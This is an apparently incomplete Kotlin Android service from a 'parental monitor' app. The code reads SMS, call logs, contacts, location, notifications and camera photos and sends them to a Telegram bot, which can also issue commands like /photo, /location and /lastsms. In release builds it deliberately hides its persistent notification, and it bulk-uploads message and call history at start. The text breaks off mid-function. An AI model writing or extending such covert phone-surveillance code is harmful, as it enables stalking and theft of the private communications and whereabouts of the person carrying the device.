package com.redeye.parentalmonitor.service

import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.redeye.parentalmonitor.ParentalMonitorApp
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.MessageQueue
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.network.TelegramClient
import com.redeye.parentalmonitor.network.TelegramMessage
import com.redeye.parentalmonitor.utils.MessageScheduler
import com.redeye.parentalmonitor.repository.CallLogRepository
import com.redeye.parentalmonitor.repository.SmsRepository
import com.redeye.parentalmonitor.utils.NetworkUtils
import com.redeye.parentalmonitor.utils.TimeFmt
import kotlinx.coroutines.*
import android.os.BatteryManager
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean

class MonitoringService : Service() {

    private lateinit var preferencesManager: PreferencesManager
    private lateinit var smsRepository: SmsRepository
    private lateinit var callLogRepository: CallLogRepository
    private lateinit var messageQueue: MessageQueue
    private lateinit var cameraService: CameraService
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val cameraBusy = AtomicBoolean(false)
    private var watchdogJob: Job? = null
    private val cameraAttempt = java.util.concurrent.atomic.AtomicInteger(0)
    private var monitoringJob: Job? = null
    private var cameraJob: Job? = null
    private var commandJob: Job? = null
    private var initialSyncJob: Job? = null
    private val initialSyncStarted = java.util.concurrent.atomic.AtomicBoolean(false)
    private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
    private var cachedBotToken = ""
    private var cachedChatId = ""
    private var credsListener: android.content.SharedPreferences.OnSharedPreferenceChangeListener? = null
    private var credsCheckAt = 0L
    private var netCheckAt = 0L
    private var netCached = false

    companion object {
        const val ACTION_START_MONITORING = "START_MONITORING"
        const val ACTION_STOP_MONITORING = "STOP_MONITORING"
        private const val NOTIFICATION_ID = 1
        private val storageWarnAt = java.util.concurrent.atomic.AtomicLong(0L)
    }

    override fun onCreate() {
        super.onCreate()
        preferencesManager = PreferencesManager.getInstance(this)
        refreshCreds()
        credsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
            if (key == "bot_token" || key == "chat_id") refreshCreds()
            if (key == "camera_interval" || key == "monitoring_paused" || key == "photo_paused_until") restartCameraLoop()
        }
        try { preferencesManager.registerChangeListener(credsListener!!) } catch (_: Exception) { }
        smsRepository = SmsRepository(this)
        callLogRepository = CallLogRepository(this)
        messageQueue = MessageQueue(this)
        cameraService = CameraService(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_MONITORING -> startMonitoring()
            ACTION_STOP_MONITORING -> stopMonitoring()
            else -> {
                if (shouldAutoResume()) {
                    startMonitoring()
                } else {
                    stopSelf()
                }
            }
        }
        return START_STICKY
    }

    private fun shouldAutoResume(): Boolean {
        return try {
            preferencesManager.isMonitoringEnabled && preferencesManager.isConfigured() && !preferencesManager.userDisabledMonitoring && preferencesManager.userConsentedMonitoring
        } catch (_: Exception) {
            false
        }
    }

    private fun escapeHtml(text: String): String {
        val out = StringBuilder(text.length + 16)
        for (c in text) {
            when (c) {
                '&' -> out.append("&amp;")
                '<' -> out.append("&lt;")
                '>' -> out.append("&gt;")
                else -> out.append(c)
            }
        }
        return out.toString()
    }

    private fun redactToken(value: String?): String {
        if (value.isNullOrEmpty()) return value ?: ""
        val token = try {
            cachedBotToken.ifEmpty { preferencesManager.botToken }
        } catch (_: Exception) {
            ""
        }
        if (token.isEmpty()) return value
        return value.replace(token, "***")
    }

    private fun startMonitoring() {
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Starting monitoring service ===")

        // Cancel any previous loops so a restart never duplicates work
        monitoringJob?.cancel()
        cameraJob?.cancel()
        commandJob?.cancel()
        initialSyncJob?.cancel()
        refreshCreds()
        
        // In RELEASE mode, make notification invisible/minimal
        val notificationBuilder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
        
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) {
            // DEBUG: Show detailed notification
            notificationBuilder
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(getString(R.string.notification_text))
        } else {
            // RELEASE: Minimal/hidden notification
            notificationBuilder
                .setContentTitle("")
                .setContentText("")
                .setShowWhen(false)
                .setSound(null)
                .setVibrate(null)
                .setSilent(true)
        }

        var foregroundTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        if (hasCameraPermission()) {
            foregroundTypes = foregroundTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        }
        if (hasLocationPermission()) {
            foregroundTypes = foregroundTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        }
        val foregroundNotification = try {
            notificationBuilder.build()
        } catch (_: Exception) {
            stopSelf()
            return
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, foregroundNotification, foregroundTypes)
            } else {
                startForeground(NOTIFICATION_ID, foregroundNotification)
            }
        } catch (e: Exception) {
            android.util.Log.w("MonitoringService", "Foreground start failed, retrying minimal", e)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(
                        NOTIFICATION_ID,
                        foregroundNotification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                } else {
                    startForeground(NOTIFICATION_ID, foregroundNotification)
                }
            } catch (_: Exception) {
                stopSelf()
                return
            }
        }
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Foreground notification started (with camera type)")
        if (!preferencesManager.isStorageEncrypted && storageWarnAt.compareAndSet(0L, System.currentTimeMillis())) {
            serviceScope.launch {
                sendToTelegram("Storage fallback active: secure storage unavailable, data kept in volatile memory until Setup is reopened.")
            }
        }

        if (!preferencesManager.initialSyncDone && !preferencesManager.initialSyncStarted && initialSyncStarted.compareAndSet(false, true)) {
            preferencesManager.initialSyncStarted = true
            initialSyncRunning.set(true)
        } else if (!preferencesManager.initialSyncDone && preferencesManager.initialSyncStarted) {
            initialSyncRunning.set(true)
        }
        startPeriodicLoops()
        initialSyncJob = serviceScope.launch {
            try {
                if (initialSyncRunning.get()) {
                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Starting initial data collection...")
                    sendInitialData()
                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Initial data collection completed")
                }
            } catch (_: Exception) {
            } finally {
                initialSyncRunning.set(false)
            }
        }
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Monitoring loop started")
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
        startCommandPolling()
        serviceScope.launch {
            registerBotCommands()
        }
    }

    private fun startPeriodicLoops() {
        monitoringJob = serviceScope.launch {
            while (isActive && monitoringJob === coroutineContext[Job]) {
                try {
                    if (!preferencesManager.monitoringPaused) {
                        checkAndSendNewData()
                    }
                    delay(syncIntervalMillis())
                } catch (e: java.util.concurrent.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error in monitoring loop", e)
                }
            }
        }
        startCameraLoop()
    }

    private fun restartCameraLoop() {
        try {
            cameraJob?.cancel()
        } catch (_: Exception) {
        }
        startCameraLoop()
    }

    private fun startCameraLoop() {
        cameraJob = serviceScope.launch {
            while (isActive && cameraJob === coroutineContext[Job]) {
                try {
                    val minutes = preferencesManager.cameraInterval.coerceIn(0, 60)
                    if (!preferencesManager.monitoringPaused && !isPhotoPaused() && minutes > 0) {
                        captureAndSendPhoto()
                        chunkedDelay(minutes * 60_000L)
                    } else if (preferencesManager.monitoringPaused) {
                        chunkedDelay(5 * 60_000L)
                    } else {
                        val remaining = preferencesManager.photoPausedUntil - System.currentTimeMillis()
                        val idle = if (remaining > 0) remaining.coerceAtMost(30 * 60_000L) else 30 * 60_000L
                        chunkedDelay(idle)
                    }
                } catch (e: java.util.concurrent.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error in camera loop", e)
                }
            }
        }
    }

    private suspend fun chunkedDelay(totalMs: Long) {
        var remaining = totalMs
        if (remaining <= 0L) return
        while (remaining > 0) {
            currentCoroutineContext().ensureActive()
            delay(minOf(remaining, 60_000L))
            remaining -= 60_000L
        }
    }

    private fun cameraIntervalMillis(): Long {
        val minutes = preferencesManager.cameraInterval.coerceIn(0, 60)
        return if (minutes <= 0) 60_000L else minutes * 60_000L
    }

    private fun refreshCreds() {
        try {
            cachedBotToken = preferencesManager.botToken
            cachedChatId = preferencesManager.chatId
        } catch (_: Exception) {
        }
    }

    private fun sendCreds(): Pair<String, String> {
        if (cachedBotToken.isEmpty() || cachedChatId.isEmpty()) refreshCreds()
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - credsCheckAt > 300_000L) {
            credsCheckAt = now
            refreshCreds()
        }
        return cachedBotToken to cachedChatId
    }

    private fun hasNetwork(): Boolean {
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - netCheckAt < 20_000L) return netCached
        netCheckAt = now
        netCached = NetworkUtils.isNetworkAvailable(this)
        return netCached
    }

    // ═══════════════════════════════════════════════════════════
    // TELEGRAM COMMAND POLLING (/photo, /status, /help)
    // ═══════════════════════════════════════════════════════════

    private var idlePolls = 0

    private fun startCommandPolling() {
        commandJob = serviceScope.launch {
            while (isActive && commandJob === coroutineContext[Job]) {
                try {
                    val active = pollTelegramCommands()
                    idlePolls = if (active) 0 else (idlePolls + 1).coerceAtMost(6)
                } catch (e: java.util.concurrent.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error polling commands", e)
                }
                if (!preferencesManager.isConfigured()) {
                    delay(60_000)
                } else if (!hasNetwork()) {
                    delay(60_000)
                } else if (authBlocked()) {
                    delay(300_000)
                } else {
                    delay(15_000L + idlePolls * 2_500L)
                }
            }
        }
    }

    private fun authBlocked(): Boolean {
        return try {
            val err = preferencesManager.credentialError
            err.isNotEmpty() && android.os.SystemClock.elapsedRealtime() - preferencesManager.credentialErrorAt < 30 * 60_000L
        } catch (_: Exception) {
            false
        }
    }

    private suspend fun pollTelegramCommands(): Boolean {
        if (authBlocked()) return false
        val (botToken, chatId) = sendCreds()
        if (botToken.isEmpty() || chatId.isEmpty()) return false

        val offset = preferencesManager.lastUpdateId + 1
        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=10"

        val response = try {
            TelegramClient.api.getUpdates(url)
        } catch (e: Exception) {
            return false
        }
        if (response.code() == 400 || response.code() == 401 || response.code() == 403) {
            try {
                preferencesManager.credentialError = response.code().toString()
                preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
            } catch (_: Exception) {
            }
            return false
        }
        if (!response.isSuccessful || response.body()?.ok != true) return false
        try {
            preferencesManager.credentialError = ""
            preferencesManager.credentialErrorAt = 0L
        } catch (_: Exception) {
        }

        val updates = response.body()?.result ?: return false
        for (update in updates) {
            try {
                val callback = update.callbackQuery
                if (callback != null) {
                    handleCallbackQuery(callback)
                    continue
                }
                val message = update.message ?: continue
                if (message.chat.id.toString() != chatId) continue
                val raw = message.text?.trim()?.substringBefore("@")?.lowercase() ?: continue
                if (!raw.startsWith("/")) continue
                handleTelegramCommand(raw)
            } finally {
                if (update.updateId > preferencesManager.lastUpdateId) {
                    preferencesManager.lastUpdateId = update.updateId
                }
            }
        }
        return updates.isNotEmpty()
    }

    private suspend fun handleCallbackQuery(query: com.redeye.parentalmonitor.network.TelegramCallbackQuery) {
        val sender = query.from?.id?.toString() ?: return
        if (sender != preferencesManager.chatId) return
        answerCallback(query.id)
        val command = when (query.data) {
            "photo" -> "/photo"
            "location" -> "/location"
            "lastcalls" -> "/lastcalls"
            "lastsms" -> "/lastsms"
            "battery" -> "/battery"
            "status" -> "/status"
            "stop" -> "/stop"
            "resume" -> "/resume"
            "camfront" -> "/camera depan"
            "camback" -> "/camera belakang"
            "pause60" -> "/pause 60"
            else -> return
        }
        handleTelegramCommand(command)
    }

    private suspend fun answerCallback(callbackId: String) {
        try {
            val token = sendCreds().first.ifEmpty { preferencesManager.botToken }
            val url = "https://api.telegram.org/bot${token}/answerCallbackQuery"
            TelegramClient.api.answerCallbackQuery(url, mapOf("callback_query_id" to callbackId))
        } catch (_: Exception) {
        }
    }

    private fun botCommandList(): List<com.redeye.parentalmonitor.network.BotCommand> {
        return listOf(
            com.redeye.parentalmonitor.network.BotCommand("photo", "Take a photo now"),
            com.redeye.parentalmonitor.network.BotCommand("camera", "Switch camera: /camera depan|belakang"),
            com.redeye.parentalmonitor.network.BotCommand("location", "Send current location"),
            com.redeye.parentalmonitor.network.BotCommand("lastcalls", "Show last 5 calls"),
            com.redeye.parentalmonitor.network.BotCommand("lastsms", "Show last 5 SMS"),
            com.redeye.parentalmonitor.network.BotCommand("photointerval", "Set photo interval 0-60 min"),
            com.redeye.parentalmonitor.network.BotCommand("pause", "Pause photos for N minutes"),
            com.redeye.parentalmonitor.network.BotCommand("battery", "Show battery level"),
            com.redeye.parentalmonitor.network.BotCommand("status", "Show monitoring status"),
            com.redeye.parentalmonitor.network.BotCommand("stop", "Pause monitoring"),
            com.redeye.parentalmonitor.network.BotCommand("resume", "Resume monitoring"),
            com.redeye.parentalmonitor.network.BotCommand("notif", "Notif forwarding: /notif on|off|status"),
            com.redeye.parentalmonitor.network.BotCommand("help", "Show all commands")
        )
    }

    private suspend fun registerBotCommands() {
        try {
            val botToken = preferencesManager.botToken
            if (botToken.isEmpty()) return
            val tokenHash = botToken.hashCode().toString()
            try {
                if (preferencesManager.commandsTokenHash == tokenHash) return
            } catch (_: Exception) {
            }
            val url = "https://api.telegram.org/bot$botToken/setMyCommands"
            val body = com.redeye.parentalmonitor.network.SetMyCommandsRequest(botCommandList())
            val response = TelegramClient.api.setMyCommands(url, body)
            if (response.isSuccessful && response.body()?.ok == true) {
                try {
                    preferencesManager.commandsTokenHash = tokenHash
                } catch (_: Exception) {
                }
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Bot command menu registered")
            } else {
                android.util.Log.w("MonitoringService", "Command menu registration failed: ${response.code()}")
            }
        } catch (e: Exception) {
            android.util.Log.w("MonitoringService", "Command menu registration error: ${redactToken(e.message)}")
        }
    }

    private fun mainMenu(): com.redeye.parentalmonitor.network.InlineKeyboardMarkup {
        fun button(text: String, data: String) =
            com.redeye.parentalmonitor.network.InlineButton(text, data)
        return com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
            listOf(
                listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDCCD Lokasi", "location")),
                listOf(button("\uD83D\uDCDE Panggilan", "lastcalls"), button("\uD83D\uDCAC SMS", "lastsms")),
                listOf(button("\uD83D\uDCF7 Depan", "camfront"), button("\uD83D\uDCF7 Belakang", "camback")),
                listOf(button("⏸️ Jeda 60 mnt", "pause60"), button("▶️ Lanjut", "resume")),
                listOf(button("\uD83D\uDD0B Baterai", "battery"), button("\uD83D\uDCCA Status", "status"))
            )
        )
    }

    private suspend fun handleTelegramCommand(raw: String) {
        val parts = raw.split("\\s+".toRegex(), limit = 2)
        val command = parts[0]
        val arg = parts.getOrNull(1)?.trim().orEmpty()
        when (command) {
            "/photo" -> {
                if (preferencesManager.monitoringPaused) {
                    sendToTelegram("⏸️ Monitoring is paused. Send /resume first.")
                } else {
                    sendToTelegram("📸 Taking photo now…")
                    captureAndSendPhoto(reportResult = true)
                }
            }
            "/status" -> {
                val lastSync = preferencesManager.lastSyncTime
                val lastSyncStr = if (lastSync > 0) formatDate(lastSync) else "never"
                val photoState = if (isPhotoPaused()) {
                    "paused until ${formatDate(preferencesManager.photoPausedUntil)}"
                } else if (preferencesManager.cameraInterval <= 0) {
                    "manual only (/photo)"
                } else {
                    "every ${preferencesManager.cameraInterval} min"
                }
                sendToTelegram(
                    buildString {
                        appendLine("📊 <b>Status</b>")
                        appendLine("Monitoring: ${if (preferencesManager.monitoringPaused) "PAUSED" else "ON"}")
                        appendLine("Last sync: $lastSyncStr")
                        appendLine("Queued: ${messageQueue.getQueueSize()}")
                        appendLine("Data interval: ${preferencesManager.syncInterval} min")
                        appendLine("Photos: $photoState")
                        appendLine("Camera: ${preferencesManager.cameraFacing}")
                        appendLine("Camera permission: ${if (hasCameraPermission()) "granted" else "MISSING"}")
                        appendLine("Location permission: ${if (hasLocationPermission()) "granted" else "MISSING"}")
                        appendLine("Background location: ${if (hasBackgroundLocation()) "granted" else "MISSING"}")
                        appendLine("Notifications: ${if (isNotifForwarding()) "forwarding" else "off"}")
                        appendLine("Last photo: ${if (preferencesManager.lastPhotoTime > 0) formatDate(preferencesManager.lastPhotoTime) else "never"}")
                    }
                )
            }
            "/lastcalls" -> {
                val calls = callLogRepository.getAllCalls(5).map { call ->
                    if (call.name == null) call.copy(name = callLogRepository.resolveContact(call.number)) else call
                }
                if (calls.isEmpty()) {
                    sendToTelegram("📞 No call history found.")
                } else {
                    sendToTelegram(formatCallMessage(calls))
                }
            }
            "/lastsms" -> {
                val sms = smsRepository.getRecentSms(5)
                if (sms.isEmpty()) {
                    sendToTelegram("💬 No SMS found.")
                } else {
                    sendToTelegram(formatSmsMessage(sms))
                }
            }
            "/photointerval" -> {
                val minutes = arg.toIntOrNull()?.coerceIn(0, 60)
                if (minutes == null) {
                    sendToTelegram("Usage: /photointerval \u003c0-60\u003e (0 = manual only)")
                } else if (minutes == 0) {
                    preferencesManager.cameraInterval = 0
                    sendToTelegram("📸 Automatic photos OFF. Use /photo for manual capture.")
                } else {
                    preferencesManager.cameraInterval = minutes
                    sendToTelegram("📸 Photo interval set to $minutes min.")
                }
            }
            "/pause" -> {
                val minutes = arg.toIntOrNull()?.coerceIn(1, 480)
                if (minutes == null) {
                    sendToTelegram("Usage: /pause \u003cminutes\u003e (1-480)")
                } else {
                    preferencesManager.photoPausedUntil = System.currentTimeMillis() + minutes * 60_000L
                    sendToTelegram("⏸️ Photos paused for $minutes min.")
                }
            }
            "/battery" -> {
                val batteryManager = getSystemService(BATTERY_SERVICE) as BatteryManager
                val level = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                sendToTelegram("🔋 <b>Battery</b>\nLevel: $level%")
            }
            "/stop" -> {
                preferencesManager.monitoringPaused = true
                sendToTelegram("⏸️ Monitoring paused. Send /resume to restart.")
            }
            "/resume" -> {
                preferencesManager.monitoringPaused = false
                preferencesManager.photoPausedUntil = 0L
                sendToTelegram("▶️ Monitoring resumed.")
            }
            "/location" -> {
                if (!hasLocationPermission()) {
                    sendToTelegram("⚠️ Location permission missing. Open Setup and grant Location permission.")
                } else {
                    sendToTelegram("📍 Locating…")
                    val location = fetchLocation()
                    if (location == null) {
                        sendToTelegram("⚠️ Location unavailable. Make sure Location/GPS is turned on.")
                    } else {
                        sendToTelegram("📍 <b>Location</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAccuracy: ${location.accuracy.toInt()} m")
                    }
                }
            }
            "/camera" -> {
                when (arg) {
                    "belakang", "back" -> {
                        preferencesManager.cameraFacing = "back"
                        sendToTelegram("📸 Camera set to back.")
                    }
                    "depan", "front" -> {
                        preferencesManager.cameraFacing = "front"
                        sendToTelegram("📸 Camera set to front.")
                    }
                    else -> {
                        sendToTelegram("Usage: /camera \u003cdepan|belakang\u003e (now: ${preferencesManager.cameraFacing})")
                    }
                }
            }
            "/notif" -> {
                when (arg.lowercase()) {
                    "on" -> {
                        preferencesManager.notifForwardEnabled = true
                        if (isNotifForwarding()) {
                            sendToTelegram("\uD83D\uDD14 Notification forwarding ON.")
                        } else {
                            sendToTelegram("Notif forwarding enabled, but OS notification access is missing. Open Setup and tap Read Notifications to allow it.")
                        }
                    }
                    "off" -> {
                        preferencesManager.notifForwardEnabled = false
                        sendToTelegram("\uD83D\uDD15 Notification forwarding OFF.")
                    }
                    "status", "" -> {
                        val state = if (isNotifForwarding()) "forwarding" else "off"
                        sendToTelegram("\uD83D\uDD14 Notifications: $state (pref: ${if (preferencesManager.notifForwardEnabled) "on" else "off"})")
                    }
                    else -> {
                        sendToTelegram("Usage: /notif <on|off|status>")
                    }
                }
            }
            "/help", "/start" -> {
                sendToTelegram(
                    buildString {
                        appendLine("👆 <b>Tap a button below</b>")
                        appendLine()
                        appendLine("🤖 <b>Commands</b>")
                        appendLine("/photo - take a photo now")
                        appendLine("/camera \u003cdepan|belakang\u003e - switch camera")
                        appendLine("/location - send current location")
                        appendLine("/lastcalls - show last 5 calls")
                        appendLine("/lastsms - show last 5 SMS")
                        appendLine("/photointerval \u003c0-60\u003e - set photo interval (0 = manual)")
                        appendLine("/pause \u003cminutes\u003e - pause photos")
                        appendLine("/battery - show battery level")
                        appendLine("/status - show monitoring status")
                        appendLine("/stop - pause monitoring")
                        appendLine("/resume - resume monitoring")
                        appendLine("/notif <on|off|status> - notif forwarding")
                        appendLine("/help - show this list")
                    },
                    mainMenu()
                )
            }
            else -> { /* ignore unknown input to avoid reply loops */ }
        }
    }

    private fun selectedLensFacing(): Int {
        return if (preferencesManager.cameraFacing == "back") {
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
        } else {
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
        }
    }

    private fun isPhotoPaused(): Boolean {
        return System.currentTimeMillis() < preferencesManager.photoPausedUntil
    }

    private fun hasBackgroundLocation(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun isNotifForwarding(): Boolean {
        if (!preferencesManager.notifForwardEnabled) return false
        return try {
            androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
        } catch (_: Exception) {
            false
        }
    }

    private fun hasLocationPermission(): Boolean {
        val fine = androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        val coarse = androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_COARSE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        return fine || coarse
    }

    @Suppress("DEPRECATION")
    private suspend fun fetchLocation(): android.location.Location? {
        if (!hasLocationPermission()) return null
        return withContext(Dispatchers.IO) {
            try {
                val locationManager = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
                val providers = listOf(
                    android.location.LocationManager.GPS_PROVIDER,
                    android.location.LocationManager.NETWORK_PROVIDER
                ).filter {
                    try {
                        locationManager.isProviderEnabled(it)
                    } catch (_: Exception) {
                        false
                    }
                }
                for (provider in providers) {
                    try {
                        val last = locationManager.getLastKnownLocation(provider)
                        if (last != null && System.currentTimeMillis() - last.time < 120_000L) {
                            return@withContext last
                        }
                    } catch (_: SecurityException) {
                        return@withContext null
                    }
                }
                val chosen = providers.firstOrNull() ?: return@withContext null
                val result = CompletableDeferred<android.location.Location?>()
                val listener = object : android.location.LocationListener {
                    override fun onLocationChanged(location: android.location.Location) {
                        result.complete(location)
                    }
                    override fun onProviderDisabled(provider: String) {}
                    override fun onProviderEnabled(provider: String) {}
                }
                try {
                    locationManager.requestSingleUpdate(chosen, listener, android.os.Looper.getMainLooper())
                } catch (_: SecurityException) {
                    return@withContext null
                }
                try {
                    withTimeoutOrNull(20_000) { result.await() }
                } finally {
                    try {
                        locationManager.removeUpdates(listener)
                    } catch (_: Exception) {
                    }
                }
            } catch (_: Exception) {
                null
            }
        }
    }

    private suspend fun sendInitialData() {
        try {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting SMS history...")
            // Get all history first
            val allSms = smsRepository.getRecentSms(100)
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${allSms.size} SMS messages")
            
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting call history...")
            val allCalls = callLogRepository.getAllCalls(100)
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${allCalls.size} calls")

            // Send start message
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending start message...")
            val startMessage = buildString {
                appendLine("📱 <b>Monitoring started</b>")
                appendLine()
                appendLine("⏰ Time: ${formatDate(System.currentTimeMillis())}")
                appendLine()
                appendLine("📊 Found on device:")
                appendLine("• SMS: ${allSms.size}")
                appendLine("• Calls: ${allCalls.size}")
                appendLine()
                appendLine("Sending history...")
            }
            sendToTelegram(startMessage)
            delay(500)

            // Send all SMS history in chunks
            if (allSms.isNotEmpty()) {
                val chunks = allSms.chunked(10)
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${chunks.size} SMS chunks...")
                chunks.forEachIndexed { index, chunk ->
                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Sending SMS chunk ${index + 1}/${chunks.size}")
                    val message = buildString {
                        appendLine("💬 <b>SMS History - part ${index + 1}/${chunks.size}</b>")
                        appendLine()
                        chunk.forEach { sms ->
                            appendLine("📞 Number: ${escapeHtml(sms.address)}")
                            val body = escapeHtml(sms.body.take(200)) // Limit SMS body to 200 chars
                            appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                            appendLine("🔄 Type: ${sms.getTypeString()}")
                            appendLine("⏰ Time: ${formatDate(sms.date)}")
                            appendLine("━━━━━━━━━━━━━━━━")
                        }
                    }
                    sendFitted(message)
                    preferencesManager.lastSmsId = chunk.maxOf { it.id }
                    delay(500)
                }
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All SMS chunks sent")
            }

            // Send all call history in chunks
            if (allCalls.isNotEmpty()) {
                val chunks = allCalls.chunked(10)
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${chunks.size} call chunks...")
                chunks.forEachIndexed { index, chunk ->
                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Sending call chunk ${index + 1}/${chunks.size}")
                    val message = buildString {
                        appendLine("📞 <b>Call History - part ${index + 1}/${chunks.size}</b>")
                        appendLine()
                        chunk.forEach { call ->
                            appendLine("📱 Number: ${escapeHtml(call.number)}")
                            if (call.name != null) {
                                appendLine("👤 Name: ${escapeHtml(call.name)}")
                            }
                            appendLine("🔄 Type: ${call.getTypeString()}")
                            appendLine("⏱️ Duration: ${call.getDurationString()}")
                            appendLine("⏰ Time: ${formatDate(call.date)}")
                            appendLine("━━━━━━━━━━━━━━━━")
                        }
                    }
                    sendFitted(message)
                    val latest = chunk.maxWith(compareBy({ it.date }, { it.id }))
                    preferencesManager.lastCallTimestamp = latest.date
                    preferencesManager.lastCallId = latest.id
                    delay(500)
                }
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All call chunks sent")
            }

            // Final message
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending completion message...")
            val photoState = if (isPhotoPaused()) {
                "paused until ${formatDate(preferencesManager.photoPausedUntil)}"
            } else if (preferencesManager.cameraInterval <= 0) {
                "manual only (/photo)"
            } else {
                "every ${preferencesManager.cameraInterval} min"
            }
            val completeMessage = buildString {
                appendLine("✅ <b>History sync complete</b>")
                appendLine()
                appendLine("From now on, only new SMS and calls will be sent.")
                appendLine()
                appendLine("📊 <b>Now</b>")
                appendLine("Monitoring: ON")
                appendLine("Data interval: ${preferencesManager.syncInterval} min")
                appendLine("Photos: $photoState")
                appendLine("Queued: ${messageQueue.getQueueSize()}")
                appendLine()
                appendLine("All commands are in the bot menu — tap /help anytime.")
            }
            sendToTelegram(completeMessage)
            preferencesManager.initialSyncDone = true
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")

        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error in initial sync: ${redactToken(e.message)}")
        }
    }

    private suspend fun checkAndSendNewData() {
        if (initialSyncRunning.get()) return
        try {
            var pages = 0
            while (pages < 1) {
                val page = smsRepository.getNewSms(preferencesManager.lastSmsId)
                if (page.isEmpty()) break
                val chunks = page.chunked(10)
                chunks.forEachIndexed { index, chunk ->
                    sendFitted(formatSmsMessage(chunk))
                    preferencesManager.lastSmsId = chunk.maxOf { it.id }
                    if (index < chunks.size - 1) delay(500)
                }
                if (page.size < 500) break
                pages++
            }
            pages = 0
            while (pages < 1) {
                val page = callLogRepository.getNewCalls(preferencesManager.lastCallTimestamp, preferencesManager.lastCallId)
                if (page.isEmpty()) break
                val chunks = page.chunked(10)
                chunks.forEachIndexed { index, chunk ->
                    sendFitted(formatCallMessage(chunk))
                    val latest = chunk.maxWith(compareBy({ it.date }, { it.id }))
                    preferencesManager.lastCallTimestamp = latest.date
